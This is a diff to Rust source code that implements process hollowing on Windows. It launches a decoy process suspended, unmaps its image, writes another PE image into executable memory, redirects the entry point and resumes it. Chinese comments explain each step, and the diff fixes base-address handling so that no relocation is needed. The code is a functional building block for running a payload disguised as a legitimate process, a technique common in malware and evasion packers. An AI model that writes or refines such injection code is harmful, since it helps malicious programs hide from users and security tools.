@@ -1,5 +1,5 @@
 use winapi::shared::basetsd::ULONG_PTR;
-use winapi::um::processthreadsapi::{CreateProcessA, ResumeThread, ExitProcess, STARTUPINFOA, PROCESS_INFORMATION};
+use winapi::um::processthreadsapi::{CreateProcessA, ResumeThread, STARTUPINFOA, PROCESS_INFORMATION};
 use winapi::um::winbase::{Wow64GetThreadContext, Wow64SetThreadContext,CREATE_SUSPENDED};
 use winapi::um::winnt::{WOW64_CONTEXT, HANDLE, CONTEXT_FULL, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE};
 use winapi::um::memoryapi::{VirtualAllocEx, ReadProcessMemory, WriteProcessMemory};
@@ -19,7 +19,6 @@ fn alloc_for_real_proc(handle: HANDLE, virtual_addr: u32, size: u32) -> Result<(
             MEM_RESERVE | MEM_COMMIT, 
             PAGE_EXECUTE_READWRITE
         );
-
         if result == null_mut(){
             return Err("alloc virtual fail".into());
         }
@@ -30,10 +29,11 @@ fn alloc_for_real_proc(handle: HANDLE, virtual_addr: u32, size: u32) -> Result<(
     }  
 }
 
-fn unload_protector_image(handle: HANDLE, base_address: *mut c_void) -> Result<(), Box<dyn Error>>{
+fn unload_protector_image(handle: HANDLE, base_address_buffer: [u8; 4]) -> Result<(), Box<dyn Error>>{
     unsafe{
         use windows::Win32::Foundation::HANDLE;
-        match ZwUnmapViewOfSection(HANDLE(handle as isize), Some(base_address))
+        let base_addr = u32::from_le_bytes(base_address_buffer);
+        match ZwUnmapViewOfSection(HANDLE(handle as isize), Some(base_addr as *const c_void))
         {
             Ok(_) => return Ok(()),
             Err(_) => return Err("(unmap image fail)".into())
@@ -86,7 +86,7 @@ fn write_real_proc_to_virtual_mem(proc_handle: HANDLE, base_addr: u32, real_proc
         let is_write = WriteProcessMemory(
             proc_handle, 
             base_addr as *mut c_void, 
-            real_proc_data.as_ptr() as *const _, 
+            real_proc_data.as_ptr() as *const c_void, 
             real_proc_data.len(), 
             &mut byte_size
         );
@@ -111,44 +111,42 @@ pub fn create_real_process(fake_proc_path: CString, real_process_data_image: &Ve
         // 3. 卸载挂起进程的映像
         // context.ebx保存了peb的首地址， context.ebx + 8记录了baseAddress
         // 因为需要获得挂起进程的baseAddr，而不是当前进程的，故需要调用ReadProcessMemory
-        let suspended_proc_base_addr = 0;
+        //let suspended_proc_base_addr: u32 = 0;
+        let mut suspended_proc_base_addr_buffer: [u8;4] = [0; 4];
         ReadProcessMemory(
             suspended_proc_pi.hProcess, 
             (suspended_proc_context.Ebx + 8) as *const _, 
-            &suspended_proc_base_addr as *const _ as *mut c_void, 
+            suspended_proc_base_addr_buffer.as_mut_ptr().cast() as *mut c_void, 
             4, 
             null_mut() as *mut usize
         );
-        unload_protector_image(suspended_proc_pi.hProcess, suspended_proc_base_addr as *mut c_void).unwrap();
+        unload_protector_image(suspended_proc_pi.hProcess, suspended_proc_base_addr_buffer).unwrap();
+        let suspended_proc_base_addr = u32::from_le_bytes(suspended_proc_base_addr_buffer);
 
         // 4. 为真正的程序分配空间
-        // 分配的位置 = 真正程序的imagebase，这样可以避免“重定位”过程
+        // 分配的位置 = 挂起进程的imagebase，这样可以避免“重定位”过程
+        // 原因是虚拟内存空间是挂起进程的，如果按real_process的imageBase来申请空间
+        // 可能会导致real_process的imageBase和挂起进程的imagebase不同，此时需要重定位
+        // 如果按挂起进程的imagebase来申请，本质就相当于把real_process的imageBase = 挂起进程的imagebase
+        // 此时无需重定位
         let mut pe_header = PEHeader::new();
         pe_header.set_pe_header(real_process_data_image.as_ptr() as usize).unwrap();
         alloc_for_real_proc(
             suspended_proc_pi.hProcess, 
-            (*pe_header.optional_header).ImageBase,
+            suspended_proc_base_addr,
             real_process_data_image.len() as u32
         ).unwrap();
 
         // 5. 将real_process的image_data放入申请的空间中
         write_real_proc_to_virtual_mem(suspended_proc_pi.hProcess,
-            (*pe_header.optional_header).ImageBase, 
+            suspended_proc_base_addr,
             &real_process_data_image
         ).unwrap();
     
 
-        // 6. 修复context的baseAddress和oep，结束当前进程
-        let real_proc_base_addr = (*pe_header.optional_header).ImageBase;
-        WriteProcessMemory(
-            suspended_proc_pi.hProcess, 
-            (suspended_proc_context.Ebx + 8) as *const u32 as *mut c_void, 
-            &real_proc_base_addr as *const u32 as *const c_void,
-            4, 
-            null_mut());
-        suspended_proc_context.Eax = (*pe_header.optional_header).ImageBase + (*pe_header.optional_header).AddressOfEntryPoint;
+        // 6. 修复context的oep，结束当前进程
+        suspended_proc_context.Eax = suspended_proc_base_addr + (*pe_header.optional_header).AddressOfEntryPoint;
         Wow64SetThreadContext(suspended_proc_pi.hThread, &suspended_proc_context);
         ResumeThread(suspended_proc_pi.hThread);
-        ExitProcess(0);
     }
 }
